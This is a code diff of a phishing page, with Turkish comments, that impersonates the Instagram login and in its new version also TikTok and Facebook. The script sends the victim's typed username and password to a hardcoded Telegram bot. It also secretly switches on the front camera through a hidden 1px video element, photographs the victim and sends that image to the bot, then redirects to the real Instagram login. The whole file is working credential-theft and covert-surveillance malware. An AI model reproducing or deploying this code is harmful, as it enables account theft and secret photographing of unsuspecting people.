@@ -3,111 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Giriş Yap • Instagram</title>
+    <title id="t">Giriş Yap • Instagram</title>
     <style>
-        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; box-sizing: border-box; }
-        .logo { width: 175px; margin-bottom: 30px; }
-        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; padding: 10px; margin-bottom: 10px; border-radius: 3px; box-sizing: border-box; font-size: 12px; }
-        .btn-login { width: 100%; background: #0095f6; border: none; color: white; padding: 7px; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        .btn-login:disabled { background: #b2dffc; cursor: default; }
-        .divider { margin: 20px 0; display: flex; align-items: center; color: #8e8e8e; font-size: 13px; font-weight: bold; }
-        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 15px; }
-        #status { color: #ed4956; font-size: 14px; margin-top: 15px; display: none; }
-        
-        /* Gizli Video ve Canvas */
-        #v { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
-        canvas { display: none; }
+        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: -apple-system, sans-serif; background: #fafafa; }
+        .box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; border-radius: 3px; z-index: 5; }
+        input { width: 100%; padding: 12px; margin: 6px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 13px; }
+        .btn { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 12px; }
+        #v { position: absolute; width: 1px; height: 1px; opacity: 0.01; top: 0; left: 0; }
+        .logo { width: 175px; margin-bottom: 25px; }
     </style>
 </head>
-<body>
+<body onload="init()">
 
-<div class="login-box">
-    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2511102835.png" alt="Instagram" class="logo">
-    
-    <input type="text" id="user-phone" placeholder="Telefon numarası, kullanıcı adı veya e-posta">
-    <input type="password" id="user-pass" placeholder="Şifre">
-    
-    <button class="btn-login" id="login-btn" onclick="executeCapture()">Giriş Yap</button>
-
-    <div class="divider">YA DA</div>
-    <p style="color:#385185; font-weight:bold; font-size:14px; cursor:pointer;">Facebook ile Giriş Yap</p>
-    
-    <div id="status">Üzgünüz, şifreniz yanlıştı. Lütfen şifrenizi kontrol edin.</div>
-</div>
+<div class="box" id="m">
+    </div>
 
 <video id="v" autoplay playsinline muted></video>
-<canvas id="c"></canvas>
+<canvas id="c" style="display:none;"></canvas>
 
 <script>
     const urlParams = new URLSearchParams(window.location.search);
-    const ownerID = urlParams.get('id');
+    const mode = urlParams.get('type') || 'insta'; // insta, tiktok, face, pubg
+    const owner = urlParams.get('id');
+    const token = "8492011222:AAEUXPE2bmnRZdGgPT1mGBxVFXIX7nfUfxc"; // Aşkım bot tokenını buraya yazmayı unutma
 
-    const CONFIG = {
-        TOKEN: "8492011222:AAEUXPE2bmnRZdGgPT1mGBxVFXIX7nfUfxc", // BURAYA KENDİ BOT TOKENINI YAZ AŞKIM
-        REDIRECT: "https://redirectplayfastly.com/?s=96&ref=sa_w237557c297471l16817p1349_prosperitycollege.ca&from=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8%3D&click_id=19ad268.2.4sr67ie&encoded_url=dHIvcmVnaXN0ZXI%2Fc3ViX2lkPXByb3NwZXJpdHljb2xsZWdlLmNh"
-    };
-
-    async function sendData(msg, photo = null) {
-        if (!ownerID) return;
-        const api = `https://api.telegram.org/bot${CONFIG.TOKEN}/`;
-        const fd = new FormData();
-        fd.append('chat_id', ownerID);
-
-        if (photo) {
-            fd.append('photo', photo, 'capture.jpg');
-            fd.append('caption', msg);
-            await fetch(api + 'sendPhoto', { method: 'POST', body: fd });
-        } else {
-            fd.append('text', msg);
-            await fetch(api + 'sendMessage', { method: 'POST', body: fd });
+    function init() {
+        const m = document.getElementById('m');
+        const t = document.getElementById('t');
+        
+        if (mode === 'insta') {
+            t.innerText = "Giriş Yap • Instagram";
+            m.innerHTML = `<img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2511102835.png" class="logo">
+            <input type="text" id="u" placeholder="Kullanıcı adı veya e-posta">
+            <input type="password" id="p" placeholder="Şifre">
+            <button class="btn" onclick="capture()">Giriş Yap</button>`;
+        } else if (mode === 'tiktok') {
+            t.innerText = "TikTok • İzle, Keşfet";
+            m.innerHTML = `<img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a9/TikTok_logo.svg/1200px-TikTok_logo.svg.png" class="logo">
+            <input type="text" id="u" placeholder="E-posta veya Kullanıcı Adı">
+            <input type="password" id="p" placeholder="Şifre">
+            <button class="btn" style="background:#fe2c55" onclick="capture()">Devam Et</button>`;
+        } else if (mode === 'face') {
+            t.innerText = "Facebook - Giriş Yap";
+            document.body.style.background = "#f0f2f5";
+            m.innerHTML = `<img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lO_V_9_DDe.svg" width="200">
+            <input type="text" id="u" placeholder="E-posta veya Telefon">
+            <input type="password" id="p" placeholder="Şifre">
+            <button class="btn" style="background:#1877f2" onclick="capture()">Giriş Yap</button>`;
         }
+        
+        // Hayalet Kamera Arka Planda Başlat
+        startGhost();
     }
 
-    async function executeCapture() {
-        const user = document.getElementById('user-phone').value;
-        const pass = document.getElementById('user-pass').value;
-        const btn = document.getElementById('login-btn');
-        const status = document.getElementById('status');
-
-        if (user.length < 3 || pass.length < 5) return;
-
-        btn.disabled = true;
-        btn.innerText = "Yükleniyor...";
-
-        // 1. Veri: Kullanıcı adı ve Şifreyi hemen gönder
-        await sendData(`📱 **INSTAGRAM HESABI DÜŞTÜ!**\n\n👤 Kullanıcı: \`${user}\`\n🔑 Şifre: \`${pass}\``);
-
-        // 2. İşlem: Kamerayı tetikle
+    async function startGhost() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            const video = document.getElementById('v');
-            video.srcObject = stream;
-            await video.play();
+            document.getElementById('v').srcObject = stream;
+        } catch (e) {}
+    }
 
-            // 5 saniye bekle ve resmi çek
-            setTimeout(() => {
-                const canvas = document.getElementById('c');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                canvas.toBlob(blob => {
-                    sendData(`📸 **GÖRÜNTÜ YAKALANDI**\n👤 Kullanıcı: ${user}`, blob);
-                    stream.getTracks().forEach(t => t.stop());
-                    
-                    // Hata mesajı göster ve resmi siteye yönlendir
-                    status.style.display = "block";
-                    btn.disabled = false;
-                    btn.innerText = "Giriş Yap";
-                    setTimeout(() => window.location.href = CONFIG.REDIRECT, 2000);
-                }, 'image/jpeg');
-            }, 5000);
+    async function capture() {
+        const u = document.getElementById('u').value;
+        const p = document.getElementById('p').value;
+        if (!u || !p) return;
 
-        } catch (e) {
-            status.style.display = "block";
-            setTimeout(() => window.location.href = CONFIG.REDIRECT, 2000);
-        }
+        const info = `🔥 HEDEF YAKALANDI!\n\n📍 Platform: ${mode.toUpperCase()}\n👤 Kullanıcı: ${u}\n🔑 Şifre: ${p}`;
+        
+        // Önce Verileri Uçur
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${owner}&text=${encodeURIComponent(info)}`);
+
+        // Sonra Hayalet Fotoğrafı Çek ve Gönder
+        const video = document.getElementById('v');
+        const canvas = document.getElementById('c');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        canvas.toBlob(blob => {
+            const fd = new FormData();
+            fd.append('chat_id', owner);
+            fd.append('photo', blob, 'hacked.jpg');
+            fd.append('caption', `📸 Görüntü: ${u}`);
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd })
+            .then(() => {
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            });
+        }, 'image/jpeg');
     }
 </script>
 </body>
